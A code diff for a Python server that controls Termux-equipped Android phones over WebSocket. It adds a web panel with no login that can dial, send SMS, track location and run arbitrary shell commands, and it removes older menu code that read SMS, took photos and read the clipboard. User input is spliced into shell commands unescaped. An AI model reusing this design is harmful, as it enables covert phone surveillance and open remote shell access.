@@ -5,6 +5,8 @@ import json
 import os
 from datetime import datetime
 from typing import Dict, List
+from aiohttp import web
+import aiohttp
 
 # Railway Configuration
 PORT = int(os.environ.get("PORT", 8080))
@@ -13,6 +15,197 @@ HOST = "0.0.0.0"
 class PhoneManager:
     def __init__(self):
         self.connected_phones: Dict = {}
+        self.http_app = web.Application()
+        self.setup_routes()
+    
+    def setup_routes(self):
+        """Setup HTTP routes for web control panel"""
+        self.http_app.router.add_get('/', self.serve_control_panel)
+        self.http_app.router.add_post('/api/command', self.handle_api_command)
+        self.http_app.router.add_get('/api/phones', self.handle_api_phones)
+        self.http_app.router.add_static('/static', 'static')
+    
+    async def serve_control_panel(self, request):
+        """Serve the HTML control panel"""
+        html_content = """
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Phone Controller</title>
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <style>
+                body { font-family: Arial, sans-serif; margin: 20px; background: #f0f0f0; }
+                .container { max-width: 800px; margin: 0 auto; background: white; padding: 20px; border-radius: 10px; }
+                .phone-list { background: #f8f9fa; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
+                .phone-item { padding: 10px; margin: 5px 0; background: white; border-radius: 5px; border-left: 4px solid #28a745; }
+                .dialer { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin: 20px 0; }
+                .dial-btn { padding: 20px; font-size: 18px; border: none; border-radius: 5px; background: #007bff; color: white; cursor: pointer; }
+                .dial-btn:hover { background: #0056b3; }
+                .command-section { margin: 20px 0; }
+                .cmd-btn { padding: 10px 15px; margin: 5px; border: none; border-radius: 5px; background: #28a745; color: white; cursor: pointer; }
+                .sms-section textarea { width: 100%; height: 100px; margin: 10px 0; }
+                .status { padding: 10px; background: #d4edda; border-radius: 5px; margin: 10px 0; }
+            </style>
+        </head>
+        <body>
+            <div class="container">
+                <h1>📱 Phone Controller</h1>
+                <div class="status" id="status">Connected to Server</div>
+                
+                <div class="phone-list">
+                    <h3>📱 Connected Phones</h3>
+                    <div id="phoneList">No phones connected</div>
+                </div>
+
+                <div class="command-section">
+                    <h3>🎯 Select Phone & Command</h3>
+                    <select id="phoneSelect">
+                        <option value="">-- Select Phone --</option>
+                    </select>
+                    
+                    <h4>📞 Dialer</h4>
+                    <div class="dialer">
+                        <button class="dial-btn" onclick="addNumber('1')">1</button>
+                        <button class="dial-btn" onclick="addNumber('2')">2</button>
+                        <button class="dial-btn" onclick="addNumber('3')">3</button>
+                        <button class="dial-btn" onclick="addNumber('4')">4</button>
+                        <button class="dial-btn" onclick="addNumber('5')">5</button>
+                        <button class="dial-btn" onclick="addNumber('6')">6</button>
+                        <button class="dial-btn" onclick="addNumber('7')">7</button>
+                        <button class="dial-btn" onclick="addNumber('8')">8</button>
+                        <button class="dial-btn" onclick="addNumber('9')">9</button>
+                        <button class="dial-btn" onclick="addNumber('*')">*</button>
+                        <button class="dial-btn" onclick="addNumber('0')">0</button>
+                        <button class="dial-btn" onclick="addNumber('#')">#</button>
+                    </div>
+                    <input type="text" id="phoneNumber" placeholder="Phone number" style="width: 100%; padding: 10px; font-size: 16px;">
+                    <button class="cmd-btn" onclick="dialNumber()">📞 Dial</button>
+                    <button class="cmd-btn" onclick="clearNumber()">Clear</button>
+                </div>
+
+                <div class="command-section">
+                    <h4>⚡ Quick Commands</h4>
+                    <button class="cmd-btn" onclick="sendCommand('termux-vibrate -d 1000')">Vibrate</button>
+                    <button class="cmd-btn" onclick="sendCommand('termux-toast \"Hello from Control Panel\"')">Show Toast</button>
+                    <button class="cmd-btn" onclick="sendCommand('termux-battery-status')">Battery Status</button>
+                    <button class="cmd-btn" onclick="sendCommand('termux-location')">Get Location</button>
+                    <button class="cmd-btn" onclick="sendCommand('termux-notification --title \"Alert\" --content \"Message from Control Panel\"')">Send Notification</button>
+                </div>
+
+                <div class="sms-section">
+                    <h4>💬 Send SMS</h4>
+                    <input type="text" id="smsNumber" placeholder="Recipient number" style="width: 100%; padding: 10px; margin: 5px 0;">
+                    <textarea id="smsMessage" placeholder="Message content"></textarea>
+                    <button class="cmd-btn" onclick="sendSMS()">Send SMS</button>
+                </div>
+
+                <div class="command-section">
+                    <h4>🔧 Custom Command</h4>
+                    <input type="text" id="customCommand" placeholder="Enter Termux command" style="width: 70%; padding: 10px;">
+                    <button class="cmd-btn" onclick="sendCustomCommand()">Execute</button>
+                </div>
+            </div>
+
+            <script>
+                let phones = [];
+                
+                // Update phone list
+                async function updatePhones() {
+                    try {
+                        const response = await fetch('/api/phones');
+                        phones = await response.json();
+                        
+                        const phoneList = document.getElementById('phoneList');
+                        const phoneSelect = document.getElementById('phoneSelect');
+                        
+                        phoneList.innerHTML = phones.length ? phones.map(phone => 
+                            `<div class="phone-item">${phone}</div>`
+                        ).join('') : 'No phones connected';
+                        
+                        phoneSelect.innerHTML = '<option value="">-- Select Phone --</option>' + 
+                            phones.map(phone => `<option value="${phone}">${phone}</option>`).join('');
+                    } catch (error) {
+                        console.error('Error updating phones:', error);
+                    }
+                }
+                
+                // Phone number functions
+                function addNumber(num) {
+                    document.getElementById('phoneNumber').value += num;
+                }
+                
+                function clearNumber() {
+                    document.getElementById('phoneNumber').value = '';
+                }
+                
+                // Send commands
+                async function sendCommand(command) {
+                    const phone = document.getElementById('phoneSelect').value;
+                    if (!phone) return alert('Please select a phone first!');
+                    
+                    try {
+                        await fetch('/api/command', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({phone, command})
+                        });
+                        alert('Command sent successfully!');
+                    } catch (error) {
+                        alert('Error sending command: ' + error);
+                    }
+                }
+                
+                async function dialNumber() {
+                    const phone = document.getElementById('phoneSelect').value;
+                    const number = document.getElementById('phoneNumber').value;
+                    if (!phone || !number) return alert('Please select phone and enter number!');
+                    
+                    await sendCommand(`termux-telephony-call "${number}"`);
+                }
+                
+                async function sendSMS() {
+                    const phone = document.getElementById('phoneSelect').value;
+                    const number = document.getElementById('smsNumber').value;
+                    const message = document.getElementById('smsMessage').value;
+                    if (!phone || !number || !message) return alert('Please fill all SMS fields!');
+                    
+                    await sendCommand(`termux-sms-send -n "${number}" "${message}"`);
+                }
+                
+                async function sendCustomCommand() {
+                    const phone = document.getElementById('phoneSelect').value;
+                    const command = document.getElementById('customCommand').value;
+                    if (!phone || !command) return alert('Please select phone and enter command!');
+                    
+                    await sendCommand(command);
+                }
+                
+                // Auto-update every 3 seconds
+                setInterval(updatePhones, 3000);
+                updatePhones();
+            </script>
+        </body>
+        </html>
+        """
+        return web.Response(text=html_content, content_type='text/html')
+    
+    async def handle_api_phones(self, request):
+        """API endpoint to get connected phones"""
+        return web.json_response(list(self.connected_phones.keys()))
+    
+    async def handle_api_command(self, request):
+        """API endpoint to send commands to phones"""
+        try:
+            data = await request.json()
+            phone_id = data.get('phone')
+            command = data.get('command')
+            
+            if phone_id and command:
+                success = await self.send_command(phone_id, command)
+                return web.json_response({'status': 'success' if success else 'phone not found'})
+            return web.json_response({'status': 'invalid data'}, status=400)
+        except Exception as e:
+            return web.json_response({'status': 'error', 'message': str(e)}, status=500)
     
     async def register_phone(self, phone_id: str, websocket):
         self.connected_phones[phone_id] = {
@@ -37,22 +230,11 @@ class PhoneManager:
                     json.dumps({"action": "shell", "command": command})
                 )
                 self.connected_phones[phone_id]['last_seen'] = datetime.now()
+                print(f"📤 Sent to {phone_id}: {command}")
                 return True
             except:
                 del self.connected_phones[phone_id]
         return False
-    
-    async def send_dial_command(self, phone_id: str, number: str) -> bool:
-        return await self.send_command(phone_id, f'termux-telephony-call "{number}"')
-    
-    async def send_sms_command(self, phone_id: str, number: str, message: str) -> bool:
-        return await self.send_command(phone_id, f'termux-sms-send -n "{number}" "{message}"')
-    
-    async def get_sms(self, phone_id: str) -> bool:
-        return await self.send_command(phone_id, "termux-sms-list -l 20")
-    
-    def get_connected_phones(self) -> List[str]:
-        return list(self.connected_phones.keys())
 
 phone_manager = PhoneManager()
 
@@ -63,300 +245,39 @@ async def handle_phone_connection(websocket, path):
     except:
         pass
 
-class PhoneControllerUI:
-    def __init__(self):
-        self.selected_phone = None
-        self.current_screen = "main"
-        self.sms_data = {}
-        
-    def clear_screen(self):
-        os.system('clear' if os.name == 'posix' else 'cls')
-    
-    def print_header(self, title: str):
-        print("┌" + "─" * 78 + "┐")
-        print(f"│ {title:^76} │")
-        print("└" + "─" * 78 + "┘")
-    
-    def print_server_info(self):
-        print(f"\n📍 Server URL: ws://YOUR_APP.railway.app")
-        print(f"📡 Internal: {HOST}:{PORT}")
-        print(f"🕒 Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
-    
-    def print_connected_phones(self):
-        phones = phone_manager.get_connected_phones()
-        print("\n📱 CONNECTED PHONES:")
-        print("─" * 80)
-        
-        if not phones:
-            print("   No phones connected - waiting for connections...")
-            return
-        
-        for i, phone in enumerate(phones, 1):
-            status = "🟢 SELECTED" if phone == self.selected_phone else "🟢 ONLINE"
-            print(f"{i:2}. {phone:<50} {status}")
-    
-    def show_main_menu(self):
-        self.clear_screen()
-        self.print_header("PHONE CONTROLLER SERVER - RAILWAY DEPLOYMENT")
-        self.print_server_info()
-        self.print_connected_phones()
-        
-        print("\n🎮 MAIN MENU:")
-        print("─" * 80)
-        if self.selected_phone:
-            print(f"📞 [1] Dialer Pad      (Selected: {self.selected_phone})")
-            print("💬 [2] SMS Manager")
-            print("⚡ [3] Command Terminal")
-            print("🔄 [4] Select Different Phone")
-        else:
-            print("👆 [1] Select a Phone to Begin")
-        
-        print("📊 [5] Refresh Status")
-        print("🌐 [6] Server Info")
-        print("❌ [7] Exit")
-        print("─" * 80)
-    
-    def show_dialer_pad(self):
-        self.clear_screen()
-        self.print_header(f"DIALER PAD - {self.selected_phone}")
-        
-        print("\n" + " " * 25 + "┌───┬───┬───┐")
-        print(" " * 25 + "│ 1 │ 2 │ 3 │")
-        print(" " * 25 + "├───┼───┼───┤")
-        print(" " * 25 + "│ 4 │ 5 │ 6 │")
-        print(" " * 25 + "├───┼───┼───┤")
-        print(" " * 25 + "│ 7 │ 8 │ 9 │")
-        print(" " * 25 + "├───┼───┼───┤")
-        print(" " * 25 + "│ * │ 0 │ # │")
-        print(" " * 25 + "└───┴───┴───┘")
-        
-        print("\n📞 QUICK DIAL:")
-        print("  [1] Call 911")
-        print("  [2] Call 112")
-        print("  [3] Call Home (555-1234)")
-        
-        print("\n🔧 OPTIONS:")
-        print("  [d] Enter Number to Dial")
-        print("  [u] Send USSD Code")
-        print("  [b] Back to Main Menu")
-        print("─" * 80)
-    
-    def show_sms_manager(self):
-        self.clear_screen()
-        self.print_header(f"SMS MANAGER - {self.selected_phone}")
-        
-        print("\n💬 SMS ACTIONS:")
-        print("─" * 80)
-        print("  [1] View Recent SMS (Last 10)")
-        print("  [2] Send New SMS")
-        print("  [3] Get SMS Inbox (Last 50)")
-        print("  [b] Back to Main Menu")
-        print("─" * 80)
-    
-    def show_command_terminal(self):
-        self.clear_screen()
-        self.print_header(f"COMMAND TERMINAL - {self.selected_phone}")
-        
-        print("\n⚡ QUICK COMMANDS:")
-        print("─" * 80)
-        print("  [1] Vibrate Device")
-        print("  [2] Show Toast Message")
-        print("  [3] Get Battery Status")
-        print("  [4] Get Location")
-        print("  [5] Send Notification")
-        print("  [6] Take Photo")
-        print("  [7] Get Clipboard")
-        
-        print("\n🎯 CUSTOM COMMAND:")
-        print("  [c] Enter custom Termux command")
-        print("  [b] Back to Main Menu")
-        print("─" * 80)
-    
-    def show_server_info(self):
-        self.clear_screen()
-        self.print_header("SERVER INFORMATION")
-        
-        print(f"\n📍 Public URL: ws://YOUR_APP.railway.app")
-        print(f"📡 Internal: {HOST}:{PORT}")
-        print(f"🚀 Status: RUNNING")
-        print(f"📱 Connected Phones: {len(phone_manager.connected_phones)}")
-        print(f"🕒 Uptime: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
-        
-        print("\n🔧 Deployment: Railway")
-        print("💾 Platform: Cloud")
-        print("🌐 Protocol: WebSocket")
-        
-        print("\nPress Enter to return...")
-        input()
-    
-    def select_phone(self):
-        phones = phone_manager.get_connected_phones()
-        if not phones:
-            input("❌ No phones connected. Press Enter to continue...")
-            return
-        
-        self.clear_screen()
-        self.print_header("SELECT PHONE")
-        self.print_connected_phones()
-        
-        try:
-            choice = int(input(f"\nSelect phone (1-{len(phones)}): "))
-            if 1 <= choice <= len(phones):
-                self.selected_phone = phones[choice - 1]
-                print(f"✅ Selected: {self.selected_phone}")
-            else:
-                print("❌ Invalid selection")
-        except ValueError:
-            print("❌ Please enter a valid number")
-        
-        input("\nPress Enter to continue...")
-    
-    async def handle_dialer_input(self):
-        while True:
-            self.show_dialer_pad()
-            choice = input("\nEnter choice: ").strip().lower()
-            
-            if choice == 'b':
-                break
-            elif choice == 'd':
-                number = input("Enter phone number: ").strip()
-                if number:
-                    success = await phone_manager.send_dial_command(self.selected_phone, number)
-                    if success:
-                        print(f"✅ Dialing: {number}")
-                    else:
-                        print("❌ Failed to send dial command")
-                    input("\nPress Enter to continue...")
-            elif choice == 'u':
-                ussd = input("Enter USSD code: ").strip()
-                if ussd:
-                    success = await phone_manager.send_command(self.selected_phone, f'termux-telephony-call "*{ussd}"')
-                    if success:
-                        print(f"✅ USSD sent: {ussd}")
-                    input("\nPress Enter to continue...")
-            elif choice in ['1', '2', '3']:
-                emergency_numbers = {'1': '911', '2': '112', '3': '555-1234'}
-                number = emergency_numbers[choice]
-                success = await phone_manager.send_dial_command(self.selected_phone, number)
-                if success:
-                    print(f"✅ Dialing: {number}")
-                input("\nPress Enter to continue...")
-    
-    async def handle_sms_input(self):
-        while True:
-            self.show_sms_manager()
-            choice = input("\nEnter choice: ").strip().lower()
-            
-            if choice == 'b':
-                break
-            elif choice == '1':
-                success = await phone_manager.send_command(self.selected_phone, "termux-sms-list -l 10")
-                if success:
-                    print("✅ Requested recent SMS")
-                input("\nPress Enter to continue...")
-            elif choice == '2':
-                number = input("Enter recipient number: ").strip()
-                if number:
-                    message = input("Enter message: ").strip()
-                    if message:
-                        success = await phone_manager.send_sms_command(self.selected_phone, number, message)
-                        if success:
-                            print("✅ SMS sent successfully")
-                input("\nPress Enter to continue...")
-            elif choice == '3':
-                success = await phone_manager.send_command(self.selected_phone, "termux-sms-list -l 50")
-                if success:
-                    print("✅ Requested SMS inbox")
-                input("\nPress Enter to continue...")
-    
-    async def handle_terminal_input(self):
-        while True:
-            self.show_command_terminal()
-            choice = input("\nEnter choice: ").strip().lower()
-            
-            if choice == 'b':
-                break
-            elif choice == 'c':
-                cmd = input("Enter Termux command: ").strip()
-                if cmd:
-                    success = await phone_manager.send_command(self.selected_phone, cmd)
-                    if success:
-                        print(f"✅ Command sent: {cmd}")
-                    input("\nPress Enter to continue...")
-            elif choice in ['1', '2', '3', '4', '5', '6', '7']:
-                commands = {
-                    '1': 'termux-vibrate -d 1000',
-                    '2': 'termux-toast "Hello from Railway Server"',
-                    '3': 'termux-battery-status',
-                    '4': 'termux-location',
-                    '5': 'termux-notification --title "Railway Alert" --content "Message from Cloud Server"',
-                    '6': 'termux-camera-photo -c 0 /sdcard/railway_photo.jpg',
-                    '7': 'termux-clipboard-get'
-                }
-                cmd = commands[choice]
-                success = await phone_manager.send_command(self.selected_phone, cmd)
-                if success:
-                    print(f"✅ Command sent: {cmd}")
-                input("\nPress Enter to continue...")
-    
-    async def run_interface(self):
-        while True:
-            self.show_main_menu()
-            choice = input("\nEnter choice: ").strip()
-            
-            if choice == '1':
-                if not self.selected_phone:
-                    self.select_phone()
-                else:
-                    await self.handle_dialer_input()
-            elif choice == '2' and self.selected_phone:
-                await self.handle_sms_input()
-            elif choice == '3' and self.selected_phone:
-                await self.handle_terminal_input()
-            elif choice == '4':
-                self.select_phone()
-            elif choice == '5':
-                continue  # Refresh screen
-            elif choice == '6':
-                self.show_server_info()
-            elif choice == '7':
-                print("👋 Shutting down server...")
-                break
-            else:
-                print("❌ Invalid choice or no phone selected")
-                input("Press Enter to continue...")
+async def start_http_server():
+    """Start HTTP server for control panel"""
+    runner = web.AppRunner(phone_manager.http_app)
+    await runner.setup()
+    site = web.TCPSite(runner, HOST, PORT)
+    await site.start()
+    print(f"🌐 Web control panel: http://{HOST}:{PORT}")
+
+async def start_websocket_server():
+    """Start WebSocket server for phones"""
+    ws_server = await websockets.serve(handle_phone_connection, HOST, PORT)
+    print(f"📡 WebSocket server running on port {PORT}")
+    return ws_server
 
 async def main():
-    # Start WebSocket server
-    print("🚀 Starting Phone Controller Server on Railway...")
-    print(f"📡 Binding to {HOST}:{PORT}")
+    print("🚀 Starting Phone Controller Server...")
+    print(f"📍 Web Panel: http://thriving-nature.up.railway.app")
+    print(f"📡 WebSocket: ws://thriving-nature.up.railway.app")
     
-    try:
-        server = await websockets.serve(handle_phone_connection, HOST, PORT)
-        print(f"✅ WebSocket server started successfully!")
-        print(f"📍 Your server URL: ws://YOUR_APP.railway.app")
-        print(f"👂 Listening for phone connections...\n")
-        
-        # Start UI
-        ui = PhoneControllerUI()
-        await ui.run_interface()
-        
-        # Cleanup
-        server.close()
-        await server.wait_closed()
-        
-    except Exception as e:
-        print(f"❌ Failed to start server: {e}")
-        print("💡 Check if the port is available and Railway environment is proper")
+    # Start both HTTP and WebSocket servers
+    await start_http_server()
+    await start_websocket_server()
+    
+    print("✅ Server started successfully!")
+    
+    # Keep server running
+    while True:
+        await asyncio.sleep(10)
 
 if __name__ == "__main__":
-    print("=" * 80)
-    print("🎯 PHONE CONTROLLER SERVER - RAILWAY DEPLOYMENT")
-    print("=" * 80)
-    
     try:
         asyncio.run(main())
     except KeyboardInterrupt:
-        print("\n👋 Server stopped by user")
+        print("\n👋 Server stopped")
     except Exception as e:
-        print(f"\n💥 Server crashed: {e}")
+        print(f"💥 Server error: {e}")
